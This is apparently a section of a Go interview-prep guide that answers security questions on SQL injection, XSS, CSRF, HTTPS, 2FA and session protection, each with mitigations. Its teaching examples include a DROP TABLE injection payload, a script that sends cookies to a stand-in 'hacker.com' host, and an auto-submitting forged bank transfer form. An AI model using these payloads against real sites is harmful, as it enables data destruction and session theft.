### [[↑]](../README.md#toc) <a name='security'>Questions about Security:</a>

#### Security by Default
> How do you write secure code? In your opinion, is it one of the developer's duties, or does it require a specialized role in the company? And why?

**Expert Answer:**
Security is the absolute duty of every developer; it cannot be bolted on at the end by a security team. "Security by default" means the easiest way to use a framework or language should also be the most secure way. In Go, `html/template` automatically escapes HTML to prevent XSS, and `database/sql` natively supports parameterized queries to prevent SQL injection. A specialized security team is for auditing, penetration testing, and setting company-wide policies (like IAM roles), but the developers write the actual logic and must own its safety.

#### Don't Invent Cryptography
> Why is it said that cryptography is not something you should try to invent or design yourself?

**Expert Answer:**
"Anyone can invent a cryptosystem that they themselves cannot break." 
Cryptography relies on incredibly complex mathematics and resistance to side-channel attacks (like measuring the microsecond timing of CPU instruction execution to guess a key). If you write your own AES implementation, you will almost certainly introduce a timing vulnerability. You must always use the standard library (like Go's `crypto` packages) which have been audited by global cryptography experts.

#### 2-FA
> What is two factor authentication? How would you implement it in an existing web application?

**Expert Answer:**
2FA requires the user to prove two of the following: Something you know (password), Something you have (phone/hardware key), Something you are (biometrics).
To implement it (e.g., TOTP - Time-Based One-Time Password):
1. User enables 2FA. The backend generates a secure random secret key (stored in the DB) and displays it as a QR code.
2. The user scans it with Google Authenticator (which hashes the secret + current Unix time).
3. On login, after the password succeeds, the backend prompts for a 6-digit code.
4. The Go backend calculates the expected 6-digit code (using the DB secret + current time) and compares it to the user's input.

#### Confidential Data in Logs
> If not carefully handled, there is always a risk of logs containing sensitive information, such as passwords. How would you deal with this?

**Expert Answer:**
Never log raw HTTP request bodies globally. Use structured logging (like Go's `slog` or `zap`) rather than `fmt.Printf`. Implement a middleware that intercepts incoming requests and outgoing responses, aggressively stripping or masking known sensitive fields (`password`, `credit_card`, `ssn`) before they hit the logging stdout. Also, ensure `pii` (Personally Identifiable Information) structs explicitly omit sensitive fields in their `String()` or `MarshalJSON()` methods.

#### SQL Injection
> Write down a snippet of code affected by SQL injection and fix it.

**Expert Answer:**
*Vulnerable Code:*
```go
// NEVER DO THIS. String concatenation allows the user to alter the SQL structure.
query := "SELECT * FROM users WHERE username = '" + userInput + "'"
db.Query(query)
// If userInput is `admin'; DROP TABLE users; --` the database is destroyed.
```

*Fix (Parameterized Query):*
```go
// The database driver strictly separates the SQL structure from the data.
query := "SELECT * FROM users WHERE username = $1"
db.Query(query, userInput)
```

#### Detect SQL Injection
> How would it be possible to detect SQL injection via static code analysis?

**Expert Answer:**
A static analysis tool (like `go vet` or `gosec` for Go) builds an Abstract Syntax Tree (AST) of the code. It traces the flow of variables from untrusted inputs (e.g., HTTP request bodies or URL parameters) to sensitive sinks (e.g., `db.Query()`). This is called **Taint Analysis**. If an untrusted, "tainted" string reaches a database execution function without passing through a sanitization function or being bound as a parameter, the tool flags it as a vulnerability.

#### XSS
> What do you know about Cross-Site Scripting? 

**Expert Answer:**
XSS occurs when an application includes untrusted, user-supplied data in a web page without proper validation or escaping. If I comment `<script>fetch('http://hacker.com?cookie=' + document.cookie)</script>` on a blog, and the backend saves it and renders it raw to other users, their browsers will execute my script and send me their session cookies. It is mitigated by context-aware output encoding (which Go's `html/template` does automatically).

#### Cross-Site Forgery Attack
> What do you know about Cross-Site Forgery Attack? 

**Expert Answer:**
CSRF tricks an authenticated user into executing an unwanted action on a web application where they are currently authenticated. 
For example, if you are logged into your bank, and visit a malicious site that contains `<form action="http://bank.com/transfer" ...><script>form.submit()</script>`, your browser will automatically attach your bank session cookie to the request, and the bank will authorize the transfer. It is mitigated using anti-CSRF tokens (a unique, unguessable string tied to the session and required on all state-changing forms) or `SameSite` cookie attributes.

#### HTTPS
> How does HTTPS work?

**Expert Answer:**
HTTPS wraps standard HTTP in a TLS (Transport Layer Security) tunnel.
1. **Handshake:** The client connects to the server and requests a secure connection.
2. **Certificate:** The server sends its public key and an SSL certificate signed by a trusted Certificate Authority (CA) to prove its identity.
3. **Key Exchange:** The client and server securely negotiate a symmetric session key (using asymmetric cryptography like RSA or Elliptic Curves).
4. **Encryption:** All subsequent HTTP traffic is encrypted rapidly using the symmetric session key.

#### MITM Attack
> What's a man-in-the-middle Attack, and why does HTTPS help protect against it?

**Expert Answer:**
A MITM attack occurs when an attacker secretly intercepts and alters the communication between two parties who believe they are directly communicating (e.g., a rogue public WiFi router). 
HTTPS defeats this via **Certificates**. If the rogue router intercepts the connection and tries to present its own encryption key, the client's browser will verify the certificate against trusted root CAs. Since the attacker doesn't have a certificate for `google.com` signed by a trusted CA, the browser throws a massive red warning and aborts the connection.

#### Stealing Sessions
> How can you prevent the user's session from being stolen?

**Expert Answer:**
1.  **HttpOnly Cookies:** Ensure the session cookie has the `HttpOnly` flag. This prevents client-side JavaScript from reading `document.cookie`, completely neutralizing XSS-based cookie theft.
2.  **Secure Flag:** Ensure the `Secure` flag is set so the cookie is only transmitted over HTTPS, preventing sniffing on open networks.
3.  **SameSite Attribute:** Set `SameSite=Strict` or `Lax` to prevent the browser from sending the cookie during cross-site requests, mitigating CSRF.
4.  **Short Expiration:** Enforce absolute session timeouts and rotate session IDs upon privilege changes (like logging in) to prevent Session Fixation.
